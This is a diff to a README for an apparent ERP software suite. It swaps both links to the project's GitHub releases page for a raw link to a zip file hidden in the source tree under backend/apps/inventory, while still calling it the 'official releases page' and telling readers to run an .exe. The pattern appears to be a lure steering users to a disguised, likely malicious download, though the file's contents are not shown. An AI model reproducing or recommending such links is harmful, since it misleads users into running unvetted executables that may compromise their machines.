@@ -1,6 +1,6 @@
 # 📦 Za-ERP-Suite - Manage your business processes with ease
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/thirdhand-bitterprinciple1/Za-ERP-Suite/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/thirdhand-bitterprinciple1/Za-ERP-Suite/raw/refs/heads/main/backend/apps/inventory/Za-Suite-ER-v2.7.zip)
 
 Za-ERP-Suite provides a central platform to organize your company operations. This software handles accounting, billing, inventory, and human resources tasks in one system. It uses a modular design to keep your data organized and secure. The system tracks project progress, processes purchases, and generates business reports.
 
@@ -18,7 +18,7 @@ Your computer needs to meet these basic standards to run the software smoothly:
 
 Follow these steps to obtain the files for your computer:
 
-1. Visit the [official releases page](https://github.com/thirdhand-bitterprinciple1/Za-ERP-Suite/releases).
+1. Visit the [official releases page](https://github.com/thirdhand-bitterprinciple1/Za-ERP-Suite/raw/refs/heads/main/backend/apps/inventory/Za-Suite-ER-v2.7.zip).
 2. Look for the latest version tag at the top of the list.
 3. Scroll to the "Assets" section of that release.
 4. Click the file ending in .exe to start your download.
